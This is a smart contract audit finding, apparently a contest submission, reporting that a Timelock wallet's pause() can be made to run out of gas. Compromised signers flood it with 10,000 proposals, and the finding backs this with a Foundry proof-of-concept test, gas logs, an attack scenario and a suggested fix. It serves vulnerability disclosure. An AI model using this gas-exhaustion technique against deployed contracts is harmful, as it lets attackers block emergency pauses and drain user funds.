# Vulnerability Details

## Impact

When the cold signers are compromised, the pause guardian calls `pause()` to cancel all malicious proposals.

By doing that, he loops over every `_liveProposal` to delete it.
This means that `pause()` will run out of gas and therefore revert, if the malicious cold signers schedule too many proposals before the pause guardian pauses.

Therefore, the contract can not be paused and the malicious proposals can be executed before the recovery spell can rotate the signing keys.

It is THE main property of a kleidi wallet that compromised cold signers can not take over the safe.

## Proof of Concept

The following test should be added to `Timelock.t.sol`:

```solidity
function testPauseDoS() public {

    for (uint256 i = 0; i < 10000; i++) {
        vm.prank(address(safe));
        timelock.schedule(
        address(timelock),
        0,
        abi.encodeWithSelector(timelock.updateDelay.selector, 30 days),
        bytes32(i),
        MINIMUM_DELAY
    );
    }

    vm.prank(guardian);
    timelock.pause();
}
```
This test schedules `10000` proposals and calls `pause()` afterwards.

Furthermore, a few lines need to be added in `Timelock.sol`:

```solidity
function pause() public override {
    /// check that msg.sender is the pause guardian, pause the contract
    super.pause();

+    console.log(gasleft());

    bytes32[] memory proposals = _liveProposals.values();
    for (uint256 i = 0; i < proposals.length; i++) {
        bytes32 id = proposals[i];

        delete timestamps[id];
        assert(_liveProposals.remove(id));

        emit Cancelled(id);
    }
+    console.log(gasleft());
}
```

Additionally, this import needs to be added on top of `Timelock.sol`:

```solidity
import {console} from "forge-std/console.sol";
```

The block gas limit on ethereum equals `30 Million` which means that any transaction that costs more gas than this will revert.
When running `forge test --mt testPauseDoS -vv` the following logs will be printed:

```
Ran 1 test for test/unit/Timelock.t.sol:TimelockUnitTest
[PASS] testPauseDoS() (gas: 1560418624)
Logs:
  18158513696823674292
  18158513696791425309

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 1.17s (1.16s CPU time)

Ran 1 test suite in 1.19s (1.17s CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)
```
The first log equals the result of the `gasleft()` function call before entering the loop.
The second log equals the result of the `gasleft()` function call after the loop, which means all proposals have been deleted.

This means that the difference of both numbers is the amount of gas that has been used by deleting every proposal. Said difference is:
`18158513696823674292 - 18158513696791425309 = 32248983`, which is higher than `30 Million`.

Taking this into account, the following scenario becomes possible:

```
timelockDelay = 2 days
delay of RecoverySpellA = 5 days
pauseDuration = 6 days
```

1. The cold signers are compromised

2. They schedule `10000` proposals to flood `_liveProposals`

3. RecoverySpellA gets created to rotate the signing keys.

4. The pause guardian calls `pause()`, as he wants to cancel all malicious proposals and buy time until the recovery spell becomes executable

5. `pause()` reverts as it reaches the block gas limit

6. After `2 days` the malicious proposals become executable and the safe is lost.


## Recommended Mitigation Steps

Consider adding a limit to the amount of proposals that can be live at the same time.
